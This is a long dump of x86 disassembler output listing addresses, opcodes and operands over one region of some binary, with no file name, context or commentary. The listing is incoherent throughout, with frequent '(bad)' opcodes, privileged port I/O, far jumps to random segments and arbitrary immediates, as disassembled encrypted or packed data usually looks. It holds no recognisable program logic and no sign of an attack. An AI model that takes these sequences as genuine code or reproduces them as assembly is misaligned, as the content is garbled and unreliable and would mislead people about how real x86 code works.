  41f6f9:	and    al,0x93
  41f6fb:	hlt    
  41f6fc:	inc    edi
  41f6fd:	cmp    eax,0xf72493b4
  41f702:	(bad)  
  41f703:	mov    edx,0xd986a615
  41f708:	outs   dx,DWORD PTR ds:[esi]
  41f709:	dec    ecx
  41f70a:	fdiv   st,st(6)
  41f70c:	pop    ebx
  41f70d:	repz retf 0xb84
  41f711:	lea    esi,[edx]
  41f713:	inc    edi
  41f714:	out    0xb,eax
  41f716:	jl     0x41f74c
  41f718:	shl    DWORD PTR ds:0xa9a4aa95,cl
  41f71e:	push   0xdcd2cd0e
  41f723:	add    al,0x96
  41f725:	cdq    
  41f726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f727:	sbb    al,0x31
  41f729:	fdiv   QWORD PTR [eax-0x7e]
  41f72c:	shr    DWORD PTR [edi],cl
  41f72e:	out    0x57,al
  41f730:	and    BYTE PTR [ebp-0x1e],bh
  41f733:	push   0x3c23becd
  41f738:	inc    ebp
  41f739:	icebp  
  41f73a:	out    dx,al
  41f73b:	mov    ebx,DWORD PTR [ebx]
  41f73d:	ret    0x6f8f
  41f740:	rcl    BYTE PTR [edi],1
  41f742:	int3   
  41f743:	lods   eax,DWORD PTR ds:[esi]
  41f744:	push   cs
  41f745:	push   ebx
  41f746:	pop    ebp
  41f747:	fwait
  41f748:	retf   0xf2d4
  41f74b:	test   BYTE PTR [eax+0x47],dl
  41f74e:	gs xchg edi,eax
  41f750:	inc    edi
  41f751:	sub    edi,eax
  41f753:	dec    esi
  41f754:	cmp    BYTE PTR [edi+0x6b504493],bh
  41f75a:	and    eax,0xd36b19a8
  41f75f:	pop    eax
  41f760:	es ins BYTE PTR es:[edi],dx
  41f762:	and    eax,0x535695a8
  41f767:	fs leave 
  41f769:	retf   0xb235
  41f76c:	add    eax,esi
  41f76e:	mov    ah,0xd9
  41f770:	int3   
  41f771:	jge    0x41f71d
  41f773:	cmp    DWORD PTR [ebp+0x353f7dcd],esp
  41f779:	mov    esp,0x563c67c2
  41f77e:	mov    esp,DWORD PTR [edx+0x13bc12f7]
  41f784:	dec    edi
  41f785:	rol    DWORD PTR [ebx-0x3f5cd79b],cl
  41f78b:	jge    0x41f730
  41f78d:	lods   eax,DWORD PTR ds:[esi]
  41f78e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f78f:	mov    al,0xde
  41f791:	mov    bh,0x64
  41f793:	out    0x50,eax
  41f795:	push   ds
  41f796:	stos   BYTE PTR es:[edi],al
  41f797:	and    eax,0xfef16c9c
  41f79c:	mov    al,ds:0xa9138a8
  41f7a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7a2:	adc    DWORD PTR [esi+0x4d],ebp
  41f7a5:	dec    eax
  41f7a6:	fist   DWORD PTR [ebp+0x2c]
  41f7a9:	mov    eax,0xc2ee6be4
  41f7ae:	lds    ebp,FWORD PTR [ebp-0x19fe805d]
  41f7b4:	adc    al,0xac
  41f7b6:	jecxz  0x41f7c5
  41f7b8:	cwde   
  41f7b9:	cli    
  41f7ba:	push   cs
  41f7bb:	inc    esp
  41f7bc:	xchg   ecx,eax
  41f7bd:	dec    esp
  41f7be:	jmp    0xbea6:0x590040b0
  41f7c5:	jmp    0x5994:0xb6199461
  41f7cc:	jecxz  0x41f7ae
  41f7ce:	test   ah,cl
  41f7d0:	inc    edx
  41f7d1:	adc    eax,0x64b7c39c
  41f7d6:	push   0x72
  41f7d8:	in     al,0xc4
  41f7da:	dec    edi
  41f7db:	add    eax,0x27f4f65a
  41f7e0:	jns    0x41f78f
  41f7e2:	mov    cl,0x5e
  41f7e4:	dec    ecx
  41f7e5:	pop    edx
  41f7e6:	cmp    ecx,eax
  41f7e8:	dec    esp
  41f7e9:	and    ecx,DWORD PTR [esi+0x36]
  41f7ec:	or     ah,BYTE PTR [edi-0x12963594]
  41f7f2:	out    dx,al
  41f7f3:	and    eax,esi
  41f7f5:	add    ebp,DWORD PTR [edi+eiz*2-0x25]
  41f7f9:	arpl   di,ax
  41f7fb:	stos   BYTE PTR es:[edi],al
  41f7fc:	stos   DWORD PTR es:[edi],eax
  41f7fd:	mov    ?,WORD PTR [edx]
  41f7ff:	mov    edx,0x3503914f
  41f804:	les    esp,FWORD PTR [ebp+0x51c6ec17]
  41f80a:	adc    eax,0xd73363e2
  41f80f:	es jno 0x41f7ad
  41f812:	aas    
  41f813:	out    dx,eax
  41f814:	and    BYTE PTR [edi-0x2d1bdd06],bh
  41f81a:	fwait
  41f81b:	daa    
  41f81c:	out    dx,al
  41f81d:	push   ebx
  41f81e:	jmp    0xbec950d2
  41f823:	mov    dh,BYTE PTR [edi+0x40eaa97f]
  41f829:	retf   0x553a
  41f82c:	mov    dh,BYTE PTR [ebx]
  41f82e:	cmc    
  41f82f:	cdq    
  41f830:	loope  0x41f7c2
  41f832:	xlat   BYTE PTR ds:[ebx]
  41f833:	out    dx,eax
  41f834:	push   edi
  41f835:	dec    ecx
  41f836:	fbld   TBYTE PTR [ebp-0x253eb64c]
  41f83c:	test   al,0xd5
  41f83e:	adc    ah,BYTE PTR [ebp+ebp*8-0x352af7b4]
  41f845:	and    edi,DWORD PTR [ecx+eiz*1+0x38]
  41f849:	fist   DWORD PTR [esi-0x62]
  41f84c:	push   esi
  41f84d:	mov    ch,0x39
  41f84f:	add    al,0x14
  41f851:	mov    ah,0x5d
  41f853:	int3   
  41f854:	pop    ebx
  41f855:	jge    0x41f7f8
  41f857:	adc    BYTE PTR [eax+eax*1+0x15],bl
  41f85b:	ror    BYTE PTR [ecx-0x66],1
  41f85e:	mov    dh,0x77
  41f860:	aas    
  41f861:	out    0x3a,al
  41f863:	inc    ebp
  41f864:	pop    ebx
  41f865:	mov    dh,0x1e
  41f867:	xlat   BYTE PTR ds:[ebx]
  41f868:	sbb    al,0x97
  41f86a:	pop    ss
  41f86b:	mov    BYTE PTR [ebx+0x21],cl
  41f86e:	imul   BYTE PTR [edi-0x66f407f8]
  41f874:	dec    esp
  41f875:	mov    dl,0x7a
  41f877:	loope  0x41f8a3
  41f879:	push   ss
  41f87a:	icebp  
  41f87b:	mov    edi,0x870b2c1
  41f880:	jno    0x41f827
  41f882:	jae    0x41f8aa
  41f884:	push   sp
  41f886:	imul   DWORD PTR [ebx]
  41f888:	or     eax,0xb67b8d05
  41f88d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f88e:	or     BYTE PTR [edi],ch
  41f890:	mov    esp,0xfdb818bf
  41f895:	mov    ah,0x9f
  41f897:	(bad)  
  41f898:	repnz jecxz 0x41f8a0
  41f89b:	push   esp
  41f89c:	pop    ecx
  41f89d:	dec    esp
  41f89e:	jge    0x41f839
  41f8a0:	jl     0x41f888
  41f8a2:	cli    
  41f8a3:	add    eax,0xcac65109
  41f8a8:	test   BYTE PTR [edx],bh
  41f8aa:	lock lock (bad) 
  41f8ad:	xchg   ebx,eax
  41f8ae:	pop    eax
  41f8af:	mov    ebx,0x767b9ab9
  41f8b4:	je     0x41f89c
  41f8b6:	push   0x33
  41f8b8:	sub    DWORD PTR [edi],ecx
  41f8ba:	inc    ebx
  41f8bb:	cmp    al,0xf
  41f8bd:	stos   DWORD PTR es:[edi],eax
  41f8be:	icebp  
  41f8bf:	sub    BYTE PTR [edx-0x2b26f2b5],dl
  41f8c5:	or     ah,BYTE PTR [ebx+0xe9408c]
  41f8cb:	jmp    DWORD PTR [eax-0x18]
  41f8ce:	jmp    0x8d2dfdb8
  41f8d3:	xchg   esp,eax
  41f8d4:	xchg   ecx,eax
  41f8d5:	call   0x2fcf2cfc
  41f8da:	jmp    0xe6f84b50
  41f8df:	inc    edi
  41f8e0:	adc    eax,0x9d3e40a1
  41f8e5:	cwde   
  41f8e6:	ss mov dx,0x18e7
  41f8eb:	add    DWORD PTR [edi+edx*4-0x703b1c6e],edi
  41f8f2:	jle    0x41f89c
  41f8f4:	pushf  
  41f8f5:	cmp    cl,BYTE PTR [ecx+0x4f]
  41f8f8:	adc    cl,cl
  41f8fa:	mov    cs,WORD PTR [edx-0x4c]
  41f8fd:	stc    
  41f8fe:	mov    eax,0xdab9f79c
  41f903:	mov    WORD PTR [esp+eax*8-0x5f],ds
  41f907:	jecxz  0x41f8ee
  41f909:	add    al,0x19
  41f90b:	inc    esi
  41f90c:	jmp    0xf44c:0x7d3a3435
  41f913:	outs   dx,BYTE PTR ds:[esi]
  41f914:	add    dh,al
  41f916:	das    
  41f917:	popa   
  41f918:	retf   
  41f919:	stc    
  41f91a:	and    eax,0x69107eb4
  41f91f:	push   edx
  41f920:	pop    esp
  41f921:	dec    esi
  41f922:	sti    
  41f923:	retfw  0xfc9a
  41f927:	outs   dx,BYTE PTR ds:[esi]
  41f928:	das    
  41f929:	mov    eax,0x95657618
  41f92e:	adc    esp,DWORD PTR [esi+0x19]
  41f931:	les    esi,FWORD PTR [edi-0x53]
  41f934:	jcxz   0x41f962
  41f937:	pop    edi
  41f938:	pop    ebp
  41f939:	push   ecx
  41f93a:	mov    bh,0x76
  41f93c:	pushf  
  41f93d:	gs into 
  41f93f:	fisttp DWORD PTR [edi+0x24]
  41f942:	push   ebx
  41f943:	pop    ss
  41f944:	adc    eax,0xca4db3dc
  41f949:	jno    0x41f935
  41f94b:	or     al,0xfa
  41f94d:	sbb    ebp,esi
  41f94f:	sti    
  41f950:	mov    BYTE PTR [edi+edx*4-0x71ec25bd],0xc1
  41f958:	popa   
  41f959:	cmc    
  41f95a:	xor    cl,BYTE PTR [ecx+0x10]
  41f95d:	push   ebx
  41f95e:	push   es
  41f95f:	pop    ebx
  41f960:	mov    ds:0x7f094d48,eax
  41f965:	hlt    
  41f966:	cmp    al,0x3d
  41f968:	push   es
  41f969:	mov    edx,0x3845ed35
  41f96e:	ss inc ebp
  41f970:	add    DWORD PTR [ecx-0x1d],ebx
  41f973:	popa   
  41f974:	pop    eax
  41f975:	pop    ecx
  41f976:	or     edx,DWORD PTR [edx+0x12]
  41f979:	or     DWORD PTR [eax-0x54],edi
  41f97c:	and    al,0x77
  41f97e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f97f:	dec    esi
  41f980:	imul   esp,edx,0xffffff85
  41f983:	popf   
  41f984:	clc    
  41f985:	adc    DWORD PTR [ebp-0x45bed06f],edi
  41f98b:	adc    BYTE PTR [eax+0xaab3d0b],cl
  41f991:	(bad)  
  41f993:	mov    al,dh
  41f995:	add    eax,0x3fbcf98b
  41f99a:	fsub   DWORD PTR [ecx+0x6c1d4da0]
  41f9a0:	ds aam 0xd9
  41f9a3:	cmp    ebx,edx
  41f9a5:	mov    ds:0x7a3133cd,eax
  41f9aa:	lock popa 
  41f9ac:	jle    0x41fa08
  41f9ae:	pop    eax
  41f9af:	jl     0x41f938
  41f9b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9b2:	in     al,0xbe
  41f9b4:	fcom   st(2)
  41f9b6:	(bad)  
  41f9b7:	cmp    BYTE PTR [eax],ch
  41f9b9:	sbb    BYTE PTR [ebp-0x2b],cl
  41f9bc:	out    0xcd,al
  41f9be:	out    dx,al
  41f9bf:	jle    0x41f9c6
  41f9c1:	mov    dh,0xb1
  41f9c3:	xor    al,0x30
  41f9c5:	jge    0x41f9dd
  41f9c7:	mov    ds:0xedf4ded7,eax
  41f9cc:	lea    eax,[edx]
  41f9ce:	add    BYTE PTR [esi+0x1508ff59],bl
  41f9d4:	jl     0x41f9c1
  41f9d6:	and    eax,0xfa61aca3
  41f9db:	test   BYTE PTR [ebp+0x11],ah
  41f9de:	adc    al,0xad
  41f9e0:	sub    eax,0xb372e404
  41f9e5:	and    bh,BYTE PTR [edi]
  41f9e7:	jg     0x41fa19
  41f9e9:	push   esp
  41f9ea:	mov    dl,0xa6
  41f9ec:	dec    edx
  41f9ed:	ins    BYTE PTR es:[edi],dx
  41f9ee:	jmp    0x41f9d0
  41f9f0:	scas   al,BYTE PTR es:[edi]
  41f9f1:	xor    eax,0x19d2b0a1
  41f9f6:	popf   
  41f9f7:	mov    al,ds:0x1d09701c
  41f9fc:	mov    BYTE PTR [eax+0x18],bh
  41f9ff:	dec    esp
  41fa00:	aas    
  41fa01:	sub    al,0x5e
  41fa03:	shl    bl,1
  41fa05:	fxch   st(7)
  41fa07:	ror    DWORD PTR [ebp-0x60bc92cc],cl
  41fa0d:	outs   dx,DWORD PTR ds:[esi]
  41fa0e:	mov    ds:0xc1ca5fa4,al
  41fa13:	inc    edi
  41fa14:	jecxz  0x41f9e0
  41fa16:	retf   
  41fa17:	and    BYTE PTR [edx+ecx*2-0x33],ah
  41fa1b:	adc    eax,DWORD PTR [ebp-0x6e]
  41fa1e:	(bad)  
  41fa1f:	mov    esp,0xabca0776
  41fa24:	jae    0x41f9ca
  41fa26:	inc    DWORD PTR [ebp+0x7fc2fa0b]
  41fa2c:	gs dec edi
  41fa2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa2f:	ror    esp,0x78
  41fa32:	lods   al,BYTE PTR ds:[esi]
  41fa33:	xchg   ecx,ecx
  41fa35:	int    0x28
  41fa37:	pop    edi
  41fa38:	ins    BYTE PTR es:[edi],dx
  41fa39:	gs mov cl,0x83
  41fa3c:	lods   eax,DWORD PTR ds:[esi]
  41fa3d:	adc    dl,0xf9
  41fa40:	aaa    
  41fa41:	jnp    0x41f9d1
  41fa43:	out    0x38,eax
  41fa45:	shl    BYTE PTR [esi-0x50],0x6d
  41fa49:	clc    
  41fa4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa4b:	sahf   
  41fa4c:	loopne 0x41fa60
  41fa4e:	repz cmp DWORD PTR [edx+0x27],0xffffffc8
  41fa53:	push   ss
  41fa54:	pushf  
  41fa55:	add    eax,0x80b967bb
  41fa5a:	std    
  41fa5b:	push   edi
  41fa5c:	xchg   DWORD PTR [eax],edx
  41fa5e:	inc    esp
  41fa5f:	cs dec esi
  41fa61:	mov    esp,0xde5541da
  41fa66:	pop    ebp
  41fa67:	dec    esp
  41fa68:	es in  al,0xe
  41fa6b:	inc    edx
  41fa6c:	ror    BYTE PTR [eax],1
  41fa6e:	inc    esp
  41fa6f:	pop    edi
  41fa70:	add    BYTE PTR [ecx],cl
  41fa72:	inc    edx
  41fa73:	scas   al,BYTE PTR es:[edi]
  41fa74:	xor    esp,DWORD PTR [edi-0x449e36c2]
  41fa7a:	in     eax,0xc5
  41fa7c:	sbb    al,0x6f
  41fa7e:	(bad)  [ecx-0x47]
  41fa81:	xlat   BYTE PTR ds:[ebx]
  41fa82:	inc    esi
  41fa83:	sahf   
  41fa84:	mov    edx,0xd3f6d6a1
  41fa89:	inc    edx
  41fa8a:	mov    eax,0x7dc5d72
  41fa8f:	xchg   edi,eax
  41fa90:	inc    esp
  41fa91:	lods   eax,DWORD PTR ds:[esi]
  41fa92:	xlat   BYTE PTR ds:[ebx]
  41fa93:	aad    0x85
  41fa95:	pop    ebp
  41fa96:	inc    eax
  41fa97:	adc    esp,DWORD PTR [ebx]
  41fa99:	fst    QWORD PTR [ebp-0x624c19f5]
  41fa9f:	pop    esp
  41faa0:	xor    BYTE PTR ds:0x9c4d5238,ch
  41faa6:	xor    bl,BYTE PTR [esi]
  41faa8:	lea    eax,[esp+edi*1+0x55aada25]
  41faaf:	lea    edx,[esi-0x7a]
  41fab2:	add    al,0x6d
  41fab4:	scas   eax,DWORD PTR es:[edi]
  41fab5:	lahf   
  41fab6:	jmp    0x1a91ddf2
  41fabb:	lods   al,BYTE PTR ds:[esi]
  41fabc:	sbb    eax,0xc36effbf
  41fac1:	pop    ebx
  41fac2:	lock xor BYTE PTR [edx+0x1bbdf8a0],dl
  41fac9:	push   ecx
  41faca:	ret    
  41facb:	les    esi,FWORD PTR [ecx]
  41facd:	jbe    0x41fb0b
  41facf:	xchg   esi,eax
  41fad0:	lds    edx,FWORD PTR [ecx+0x16ff425b]
  41fad6:	xchg   edi,eax
  41fad7:	into   
  41fad8:	out    0xf5,al
  41fada:	sbb    al,0xe8
  41fadc:	add    eax,0xa88ffb1
  41fae1:	inc    edi
  41fae2:	or     cl,BYTE PTR [esp+ebp*1-0x21b5f37a]
  41fae9:	mov    al,ds:0x574a4a58
  41faee:	pop    edx
  41faef:	push   edi
  41faf0:	pop    ebp
  41faf1:	dec    edi
  41faf2:	mov    dh,0x0
  41faf4:	dec    edx
  41faf5:	push   ecx
  41faf6:	enter  0xdaa4,0xc6
  41fafa:	pusha  
  41fafb:	mov    al,BYTE PTR [ecx]
  41fafd:	add    BYTE PTR [eax-0x7afffffa],cl
  41fb03:	scas   eax,DWORD PTR es:[edi]
  41fb04:	jle    0x41fb50
  41fb06:	push   ss
  41fb07:	sub    eax,0x15bd121b
  41fb0c:	dec    esi
  41fb0d:	popa   
  41fb0e:	or     al,0x63
  41fb10:	cmp    eax,0xbfcee892
  41fb15:	cwde   
  41fb16:	xchg   edi,eax
  41fb17:	jns    0x41fb6b
  41fb19:	push   eax
  41fb1a:	mov    ecx,0x49ab1de1
  41fb1f:	mov    ebp,0xd8918cee
  41fb24:	mov    edi,0x6daeb877
  41fb29:	xchg   ebp,eax
  41fb2a:	or     ch,BYTE PTR [ecx+0x2c]
  41fb2d:	cmp    al,0x2d
  41fb2f:	sar    BYTE PTR [ecx],0xec
  41fb32:	add    eax,0xeadf19ed
  41fb37:	mov    dl,0x52
  41fb39:	mov    esp,0xadbc29
  41fb3e:	lock xor eax,0x489a9e6b
  41fb44:	cmp    al,0xd8
  41fb46:	sbb    BYTE PTR [esp+ebp*4],0xf7
  41fb4a:	jbe    0x41fbb3
  41fb4c:	inc    ebp
  41fb4d:	push   ecx
  41fb4e:	inc    ecx
  41fb4f:	and    al,0x80
  41fb51:	mov    al,ds:0x4ab6c88a
  41fb56:	jno    0x41fb2c
  41fb58:	scas   al,BYTE PTR es:[edi]
  41fb59:	xchg   ebp,eax
  41fb5a:	dec    edi
  41fb5b:	xlat   BYTE PTR ds:[ebx]
  41fb5c:	xchg   ebx,eax
  41fb5d:	mov    dl,0x7
  41fb5f:	out    0x64,eax
  41fb61:	mov    ds:0xc0bcf10d,al
  41fb66:	faddp  st(2),st
  41fb68:	in     al,0x78
  41fb6a:	test   ebp,0x63934f36
  41fb70:	das    
  41fb71:	scas   al,BYTE PTR es:[edi]
  41fb72:	xchg   edi,eax
  41fb73:	data16 test al,0xc4
  41fb76:	xor    al,cl
  41fb78:	scas   eax,DWORD PTR es:[edi]
  41fb79:	int    0xf3
  41fb7b:	inc    ebp
  41fb7c:	inc    eax
  41fb7d:	pushf  
  41fb7e:	into   
  41fb7f:	stos   DWORD PTR es:[edi],eax
  41fb80:	jno    0x41fbc9
  41fb82:	aad    0x3f
  41fb84:	jbe    0x41fb29
  41fb86:	loopne 0x41fb6e
  41fb88:	push   esp
  41fb89:	xchg   ebp,eax
  41fb8a:	cmp    ah,0x8
  41fb8d:	pop    esi
  41fb8e:	or     al,0xc
  41fb90:	std    
  41fb91:	dec    esp
  41fb92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb93:	xor    eax,0x267cea03
  41fb98:	ret    0xdaf7
  41fb9b:	sahf   
  41fb9c:	(bad)
  41fb9f:	xchg   edx,eax
  41fba0:	cli    
  41fba1:	sbb    bl,BYTE PTR [ebx-0x7c14b779]
  41fba7:	(bad)  
  41fba8:	or     al,0xe2
  41fbaa:	mov    dl,0x82
  41fbac:	cmp    BYTE PTR [esi+0x4d5ca8f7],bh
  41fbb2:	test   al,0x5
  41fbb4:	mov    dl,bl
  41fbb6:	scas   eax,DWORD PTR es:[edi]
  41fbb7:	mov    edi,0xa8b79f43
  41fbbc:	mov    edx,0x24526e76
  41fbc1:	push   edx
  41fbc2:	stos   BYTE PTR es:[edi],al
  41fbc3:	adc    DWORD PTR ss:0x4962129c,ebp
  41fbca:	mov    ch,0xa5
  41fbcc:	xor    bl,cl
  41fbce:	push   ebp
  41fbcf:	popa   
  41fbd0:	(bad)  
  41fbd1:	jmp    0x41fbe7
  41fbd3:	cld    
  41fbd4:	std    
  41fbd5:	xchg   ebp,eax
  41fbd6:	pop    ebx
  41fbd7:	push   cs
  41fbd8:	mov    DWORD PTR [ebx+ebp*4+0x6c862102],eax
  41fbdf:	out    dx,al
  41fbe0:	pop    ecx
  41fbe1:	pop    esp
  41fbe2:	dec    ecx
  41fbe3:	cwde   
  41fbe4:	jle    0x41fbda
  41fbe6:	xchg   esp,eax
  41fbe7:	lods   eax,DWORD PTR ds:[esi]
  41fbe8:	jo     0x41fbac
  41fbea:	fdiv   QWORD PTR [ebx+eiz*4]
  41fbed:	fcmovb st,st(2)
  41fbef:	jge    0x41fb72
  41fbf1:	sbb    BYTE PTR [eax-0x4a73ea21],cl
  41fbf7:	or     eax,DWORD PTR [ebx]
  41fbf9:	or     edx,0x54
  41fbfc:	inc    edx
  41fbfd:	and    ebp,esi
  41fbff:	or     esi,ebx
  41fc01:	aas    
  41fc02:	and    BYTE PTR [edi],0x19
  41fc05:	lods   eax,DWORD PTR ds:[esi]
  41fc06:	cmp    al,0x4c
  41fc08:	add    DWORD PTR [esi+0x38],ecx
  41fc0b:	jb     0x41fc5e
  41fc0d:	retf   0x6226
  41fc10:	push   0x7c
  41fc12:	xor    BYTE PTR fs:[ebp-0x73],dh
  41fc16:	cmp    ah,BYTE PTR [ebp+0x4dcecfad]
  41fc1c:	cmp    BYTE PTR [edx-0x52e531ed],bh
  41fc22:	test   DWORD PTR [ebx+0x792d89a7],ecx
  41fc28:	add    ebx,DWORD PTR [edx]
  41fc2a:	adc    ah,BYTE PTR [ecx+0x7f75bea]
  41fc30:	iret   
  41fc31:	cmp    DWORD PTR [ebp+0x25],ebp
  41fc34:	sbb    dh,BYTE PTR [ebx]
  41fc36:	into   
  41fc37:	push   es
  41fc38:	xor    DWORD PTR [ebx-0x27],eax
  41fc3b:	(bad)  
  41fc3c:	push   esi
  41fc3d:	je     0x41fc46
  41fc3f:	inc    edi
  41fc40:	xchg   esp,eax
  41fc41:	sub    al,0x6c
  41fc43:	dec    ebp
  41fc44:	sbb    DWORD PTR [eax-0x78e17e8e],ebx
  41fc4a:	jns    0x41fc1b
  41fc4c:	jg     0x41fcc2
  41fc4e:	jmp    0x54391459
  41fc53:	adc    edi,DWORD PTR [edx+0x92f474]
  41fc59:	sbb    BYTE PTR [edx+0x49],0x48
  41fc5d:	pop    esi
  41fc5e:	xchg   BYTE PTR [edx+esi*4-0xe5a46b2],bl
  41fc65:	cmp    BYTE PTR [esi-0x17],dh
  41fc68:	das    
  41fc69:	ins    DWORD PTR es:[edi],dx
  41fc6a:	push   ecx
  41fc6b:	test   DWORD PTR [eax],edi
  41fc6d:	mov    bl,0xe3
  41fc6f:	cs clc 
  41fc71:	fsubr  DWORD PTR [ebx+0x2257f300]
  41fc77:	mov    ebp,0xa231f4b7
  41fc7c:	mov    dh,0xe0
  41fc7e:	xor    eax,0x782ca86b
  41fc83:	mov    ss:0x6a15195d,al
  41fc89:	mov    BYTE PTR gs:[esi],dl
  41fc8c:	(bad)  
  41fc8d:	std    
  41fc8e:	jl     0x41fc71
  41fc90:	test   DWORD PTR [eax],ebx
  41fc92:	mov    bh,0x65
  41fc94:	aaa    
  41fc95:	add    dl,BYTE PTR [eax-0x26]
  41fc98:	int3   
  41fc99:	popa   
  41fc9a:	xchg   edi,eax
  41fc9b:	jge    0x41fce4
  41fc9d:	mov    bh,0x16
  41fc9f:	lock call 0x8662:0xab0fc7a
  41fca7:	and    DWORD PTR [eax-0x4],ecx
  41fcaa:	xchg   BYTE PTR [ebp+0x5f],ch
  41fcad:	pop    ds
  41fcae:	(bad)  
  41fcaf:	inc    edi
  41fcb0:	xchg   edi,eax
  41fcb1:	lods   al,BYTE PTR ds:[esi]
  41fcb2:	lahf   
  41fcb3:	lahf   
  41fcb4:	xor    esi,esi
  41fcb6:	enter  0x438,0x82
  41fcba:	les    ecx,FWORD PTR [edx+0x6e]
  41fcbd:	dec    ebp
  41fcbe:	retf   
  41fcbf:	cmp    ch,BYTE PTR [esi-0xe83ba16]
  41fcc5:	push   esi
  41fcc6:	cmp    bl,ah
  41fcc8:	inc    edi
  41fcc9:	dec    edx
  41fcca:	sti    
  41fccb:	enter  0x91b3,0xcc
  41fccf:	add    BYTE PTR [edi+0x73],cl
  41fcd2:	push   cs
  41fcd3:	(bad)  
  41fcd4:	bound  esi,QWORD PTR [ecx+0x53956161]
  41fcda:	push   ebp
  41fcdb:	mov    ecx,ecx
  41fcdd:	xor    eax,0x398311a5
  41fce2:	fbld   TBYTE PTR [esi-0x7b]
  41fce5:	mov    al,ds:0x5f9a92b2
  41fcea:	iret   
  41fceb:	sbb    dl,BYTE PTR [eax+0x11]
  41fcee:	mov    ah,0x52
  41fcf0:	pop    eax
  41fcf1:	xor    al,0xc8
  41fcf3:	mov    dh,0x1b
  41fcf5:	bound  ebp,QWORD PTR [ecx+ebx*1]
  41fcf8:	adc    edi,edx
  41fcfa:	push   edi
  41fcfb:	aam    0xee
  41fcfd:	out    0x8d,eax
  41fcff:	cs pop ds
  41fd01:	adc    eax,0xe3c21731
  41fd06:	test   edi,ebp
  41fd08:	xchg   edx,eax
  41fd09:	imul   DWORD PTR [ebx]
  41fd0b:	rcl    ebp,0xca
  41fd0e:	mov    bl,0xa9
  41fd10:	fidivr WORD PTR [eax+0x8]
  41fd13:	dec    eax
  41fd14:	das    
  41fd15:	sub    BYTE PTR [esi+0x31],bl
  41fd18:	pop    ds
  41fd19:	lods   al,BYTE PTR ds:[esi]
  41fd1a:	mov    ah,0x39
  41fd1c:	sbb    DWORD PTR [esp+esi*8],eax
  41fd1f:	fsubp  st(5),st
  41fd21:	cmp    esi,DWORD PTR [ebp+0xc]
  41fd24:	in     eax,dx
  41fd25:	repnz sbb DWORD PTR [ebp+0x79],esi
  41fd29:	mov    ds,WORD PTR [ebp-0x48a0ff6b]
  41fd2f:	ss pop eax
  41fd31:	sub    ch,BYTE PTR ds:[edi+0x64e679e6]
  41fd38:	fst    DWORD PTR ds:0x8ed70434
  41fd3e:	and    BYTE PTR [ebx],ch
  41fd40:	cwde   
  41fd41:	jp     0x41fd68
  41fd43:	push   cs
  41fd44:	sub    DWORD PTR [ebp-0x45],0xfffffff0
  41fd48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd49:	pop    ss
  41fd4a:	ror    DWORD PTR [ebx-0x6f0fcae9],cl
  41fd50:	(bad)  ds:0x8c433828
  41fd56:	add    BYTE PTR [ebp+0x2a293bdb],0xb5
  41fd5d:	add    ecx,DWORD PTR [edx-0x6a4c868]
  41fd63:	ja     0x41fd38
  41fd65:	nop
  41fd66:	nop
  41fd67:	sbb    al,0x95
  41fd69:	fucom  st(0)
  41fd6b:	cmp    al,0xed
  41fd6d:	sbb    BYTE PTR [ecx+esi*4+0x49],al
  41fd71:	lods   eax,DWORD PTR ds:[esi]
  41fd72:	stos   BYTE PTR es:[edi],al
  41fd73:	jo     0x41fd99
  41fd75:	cmp    DWORD PTR [esi],esp
  41fd77:	lds    ecx,FWORD PTR [ebx]
  41fd79:	mov    edx,0xc07fc8f8
  41fd7e:	xchg   ebp,eax
  41fd7f:	cmp    esp,DWORD PTR [edi-0x64]
  41fd82:	xor    esp,edi
  41fd84:	lods   eax,DWORD PTR ds:[esi]
  41fd85:	inc    BYTE PTR [ebp-0x5b]
  41fd88:	leave  
  41fd89:	cdq    
  41fd8a:	lea    edi,ds:0xa7f185bb
  41fd90:	fiadd  DWORD PTR fs:[edi-0x12d84283]
  41fd97:	fsub   DWORD PTR [eax-0x2f]
  41fd9a:	dec    ecx
  41fd9b:	aam    0x82
  41fd9d:	jns    0x41fe04
  41fd9f:	sti    
  41fda0:	aas    
  41fda1:	sbb    ah,cl
  41fda3:	or     al,0x53
  41fda5:	dec    ebx
  41fda6:	aad    0x37
  41fda8:	out    dx,eax
  41fda9:	cld    
  41fdaa:	and    eax,0x9507677d
  41fdaf:	cwde   
  41fdb0:	idiv   BYTE PTR [edi]
  41fdb2:	and    eax,0xae5ace0d
  41fdb7:	pop    ds
  41fdb8:	leave  
  41fdb9:	or     edx,DWORD PTR [edx-0x366e2643]
  41fdbf:	test   BYTE PTR [edx-0x2f4e23b9],ah
  41fdc5:	loopne 0x41fe13
  41fdc7:	jmp    0x731c:0x9a66605e
  41fdce:	fwait
  41fdcf:	dec    ecx
  41fdd1:	adc    al,BYTE PTR ds:0x624622a1
  41fdd7:	test   DWORD PTR [esi-0x612065bb],ebp
  41fddd:	not    dl
  41fddf:	or     BYTE PTR [ebp+0x7a580a3e],cl
  41fde5:	loope  0x41fdd3
  41fde7:	imul   edi,DWORD PTR [edi+edx*2],0x9ff7cab6
  41fdee:	lahf   
  41fdef:	inc    ebp
  41fdf0:	test   DWORD PTR [ecx-0x5913ab56],eax
  41fdf6:	cmp    dl,dl
  41fdf8:	jae    0x41fe72
  41fdfa:	test   DWORD PTR [edx+eiz*1-0xc6d928],esp
  41fe01:	inc    edx
  41fe02:	call   0x8d89:0xfc8424f8
  41fe09:	pop    ss
  41fe0a:	addr16 pop es
  41fe0c:	push   ss
  41fe0d:	push   0xffffff87
  41fe0f:	sbb    edi,edx
  41fe11:	scas   al,BYTE PTR es:[edi]
  41fe12:	scas   al,BYTE PTR es:[edi]
  41fe13:	sub    edx,esi
  41fe15:	in     al,0x58
  41fe17:	aad    0x52
  41fe19:	mov    dl,0x38
  41fe1b:	jl     0x41fdd1
  41fe1d:	out    0x53,al
  41fe1f:	push   ecx
  41fe20:	lods   al,BYTE PTR ds:[esi]
  41fe21:	and    ebp,DWORD PTR [ecx-0x79]
  41fe24:	push   cs
  41fe25:	fcmovu st,st(2)
  41fe27:	fs push esp
